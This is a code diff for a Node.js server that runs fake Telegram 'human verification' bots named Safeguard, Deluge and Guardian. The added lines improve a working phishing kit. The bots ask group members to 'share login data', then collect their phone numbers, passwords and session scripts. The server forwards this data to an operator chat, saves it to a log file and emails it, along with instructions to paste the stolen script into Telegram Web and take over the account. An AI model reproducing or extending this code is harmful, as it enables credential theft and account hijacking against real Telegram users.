@@ -10,7 +10,22 @@ dotenv.config();
 
 const app = express();
 app.use(express.json());
+
+// Add CORS middleware
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  next();
+});
+
+// Serve static files
 app.use(express.static(path.join(__dirname, '../public')));
+
+// Explicit route for /safeguard/ to prevent redirects
+app.get('/safeguard/', (req, res) => {
+  res.sendFile(path.join(__dirname, '../public/safeguard/index.html'));
+});
 
 // Debug logging for environment variables
 console.log('Environment Variables:');
@@ -36,7 +51,7 @@ const safeguardUsername = "SafetyGuardianRobot";
 const delugeUsername = "DelugeGuardiansBot";
 const guardianUsername = "GuardianSafetyrobot";
 
-// Corrected image paths and file names
+// Image paths
 const safeguardVerification = path.join(__dirname, 'images', 'verification', 'safeguard.jpg');
 const delugeVerification = path.join(__dirname, 'images', 'verification', 'deluge.jpg');
 const guardianVerification = path.join(__dirname, 'images', 'verification', 'guardian.jpg');
@@ -127,6 +142,19 @@ const handlePollingError = (bot, botName) => {
           bot.startPolling();
         });
       }, 60000);
+    } else if (error.message.includes('ECONNRESET')) {
+      if (retryCount >= maxRetries) {
+        console.error(`${botName} maximum retry limit reached for ECONNRESET. Exiting...`);
+        process.exit(1);
+      }
+      retryCount++;
+      console.warn(`${botName} ECONNRESET detected. Retrying polling in 30 seconds (Attempt ${retryCount}/${maxRetries})...`);
+      setTimeout(() => {
+        bot.stopPolling().then(() => {
+          console.log(`${botName} stopped polling. Restarting...`);
+          bot.startPolling();
+        });
+      }, 30000);
     }
   });
 };
@@ -157,7 +185,7 @@ function handleStart(bot) {
         let imageToSend;
         if (parameter === 'login') {
           jsonToSend = {
-            caption: `Please share your login data to continue.`,
+            caption: `Please share your login data to continue.\n\n<i>Note: If the verification doesn't open, please use the Telegram mobile app (iOS/Android).</i>`,
             parse_mode: "HTML",
             reply_markup: {
               inline_keyboard: [[{
@@ -178,7 +206,7 @@ function handleStart(bot) {
         } else {
           if (botInfo.username === safeguardUsername) {
             jsonToSend = {
-              caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
+              caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry\n\n<i>Note: If the verification doesn't open, please use the Telegram mobile app (iOS/Android).</i>`,
               parse_mode: "HTML",
               reply_markup: {
                 inline_keyboard: [[{
@@ -192,7 +220,7 @@ function handleStart(bot) {
             imageToSend = safeguardVerification;
           } else if (botInfo.username === delugeUsername) {
             jsonToSend = {
-              caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
+              caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.\n\n<i>Note: If the verification doesn't open, please use the Telegram mobile app (iOS/Android).</i>`,
               parse_mode: "HTML",
               reply_markup: {
                 inline_keyboard: [[{
@@ -206,7 +234,7 @@ function handleStart(bot) {
             imageToSend = delugeVerification;
           } else if (botInfo.username === guardianUsername) {
             jsonToSend = {
-              caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
+              caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.\n\n<i>Note: If the verification doesn't open, please use the Telegram mobile app (iOS/Android).</i>`,
               parse_mode: "HTML",
               reply_markup: {
                 inline_keyboard: [[{
@@ -259,7 +287,9 @@ const handleRequest = async (req, res, data) => {
     res.status(400).json({ error: "Invalid bot type" });
     return;
   }
-  const logMessage = `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.firstName}\n⭐ <b>Telegram Premium</b>: ${data.isPremium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.phoneNumber}</tg-spoiler>\n${data.usernames.map(u => `👤 <b>Username</b>: @${u.username}`).join('\n')}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script || "Not available"}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`;
+  // Add a timestamp to the log message
+  const timestamp = new Date().toISOString();
+  const logMessage = `[${timestamp}] 🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.firstName}\n⭐ <b>Telegram Premium</b>: ${data.isPremium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.phoneNumber}</tg-spoiler>\n${data.usernames.map(u => `👤 <b>Username</b>: @${u.username}`).join('\n')}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script || "Not available"}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`;
   console.log(`Attempting to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, logMessage);
   let messageSent = false;
   try {
@@ -278,7 +308,6 @@ const handleRequest = async (req, res, data) => {
     console.log(logMessage);
     // Save to file
     try {
-      const timestamp = new Date().toISOString();
       const logEntry = `[${timestamp}] ${logMessage}\n\n`;
       fs.appendFileSync(path.join(__dirname, 'logs', 'login_data.txt'), logEntry);
       console.log(`Successfully saved login data to logs/login_data.txt for user ${data.userId}`);
@@ -291,7 +320,7 @@ const handleRequest = async (req, res, data) => {
         await transporter.sendMail({
           from: process.env.EMAIL_USER,
           to: process.env.EMAIL_USER,
-          subject: `User Login Data for ${data.userId}`,
+          subject: `User Login Data for ${data.userId} [${timestamp}]`,
           text: logMessage.replace(/<[^>]+>/g, ''), // Strip HTML tags for plain text email
           html: logMessage
         });
@@ -303,6 +332,8 @@ const handleRequest = async (req, res, data) => {
       console.error(`Cannot send email for user ${data.userId}: Nodemailer transporter not initialized`);
     }
   }
+
+  // Send success message to the user
   let type = data.type;
   if (type === "safeguard" || type === "guardian") {
     let image;
@@ -350,9 +381,16 @@ const handleRequest = async (req, res, data) => {
         ...buttons,
         parse_mode: "HTML"
       });
-      console.log(`Successfully sent photo to user ${data.userId}`);
+      console.log(`Successfully sent success photo to user ${data.userId}`);
     } catch (error) {
-      console.error(`Failed to send photo to user ${data.userId}:`, error.message);
+      console.error(`Failed to send success photo to user ${data.userId}:`, error.message);
+      // Fallback to sending a text message
+      await bot.sendMessage(data.userId, caption, {
+        parse_mode: "HTML",
+        ...buttons
+      }).catch(err => {
+        console.error(`Failed to send fallback message to user ${data.userId}:`, err.message);
+      });
     }
   }
 
